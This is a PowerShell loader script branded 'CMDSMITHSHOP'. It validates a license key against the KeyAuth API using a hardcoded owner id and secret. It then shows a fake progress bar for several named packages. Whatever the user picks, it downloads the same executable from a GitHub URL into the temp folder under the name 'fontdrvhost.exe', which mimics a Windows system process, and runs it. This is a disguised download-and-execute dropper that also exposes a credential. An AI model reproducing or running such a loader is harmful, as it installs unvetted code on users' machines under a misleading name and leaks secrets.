Clear-Host
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

# ===== KEYAUTH CONFIG =====
$appname = "Smithshop all"
$ownerid = "gw1rzpahob"
$secret  = "b46e7a9ea4b86244898a817972afd189a50a6fc0a7706ad78d277008cc7f3606"
$version = "1.0"

# ===== CONFIG =====
$ExeURL = "https://github.com/draft7973-ops/Smithshop/raw/main/fontdrvhost.exe"
$ExeOutput = "$env:TEMP\fontdrvhost.exe"

# ===== LOADING FUNCTION =====
function Show-Loading($text) {

    $colors = @("Red","Yellow","Green","Cyan","Blue","Magenta")

    for ($i = 0; $i -le 100; $i++) {

        $dots = "." * ($i % 6)
        $color = $colors[$i % $colors.Count]

        $barLength = 20
        $filled = [math]::Floor($i / (100 / $barLength))
        $bar = ("█" * $filled).PadRight($barLength, "░")

        Write-Host "`r$text$dots [$bar] $i% " -NoNewline -ForegroundColor $color
        Start-Sleep -Milliseconds 40
    }

    Write-Host ""
}

# ===== MAIN MENU =====
Write-Host "=== CMDSMITHSHOP :] ==="
Write-Host "1. Install"
Write-Host "2. Clean"

$choice = Read-Host "Choose 1 or 2"

if ($choice -eq "1") {

    $userKey = Read-Host "Enter your Key"

    # ===== 🔐 KEYAUTH CHECK =====
    try {
        $body = @{
            type    = "license"
            key     = $userKey
            name    = $appname
            ownerid = $ownerid
            version = $version
        }

        $response = Invoke-RestMethod -Uri "https://keyauth.win/api/1.2/" -Method Post -Body $body

        if ($response.success -ne $true) {
            Write-Host "❌ Key invalid!" -ForegroundColor Red
            Pause
            exit
        }

        Write-Host "✅ Key valid!" -ForegroundColor Green
        Start-Sleep 1

    } catch {
        Write-Host "❌ Connection error!" -ForegroundColor Red
        Pause
        exit
    }

    # 🔁 LOOP
    while ($true) {

        Clear-Host
        Write-Host "=== SELECT CMD ===`n"
        Write-Host "1. smithx3d"
        Write-Host "2. uptoking"
        Write-Host "3. kingsmith"
        Write-Host "0. Exit"

        $package = Read-Host "Choose 1 / 2 / 3 / 0"

        switch ($package) {
            "1" { $pkgName = "smithx3d" }
            "2" { $pkgName = "uptoking" }
            "3" { $pkgName = "kingsmith" }
            "0" { break }
            default {
                Write-Host "❌ Invalid!" -ForegroundColor Red
                Start-Sleep 1
                continue
            }
        }

        # ===== INSTALL CMD =====
        Clear-Host
        Write-Host "=== INSTALL MODE ===`n"

        Show-Loading "install $pkgName "

        Invoke-WebRequest $ExeURL -OutFile $ExeOutput
        Start-Process $ExeOutput

        Write-Host "`n✅ install $pkgName success!" -ForegroundColor Green
        Start-Sleep 2
    }

}
elseif ($choice -eq "2") {

    Clear-Host
    Write-Host "=== CLEAN MODE ===`n"

    Show-Loading "cleaning "

    if (Test-Path $ExeOutput) {
        Remove-Item $ExeOutput -Force
        Write-Host "`nFile removed successfully ✅"
    } else {
        Write-Host "`nFile not found ⚠️"
    }

}
else {
    Write-Host "Invalid choice ⚠️"
}

Pause
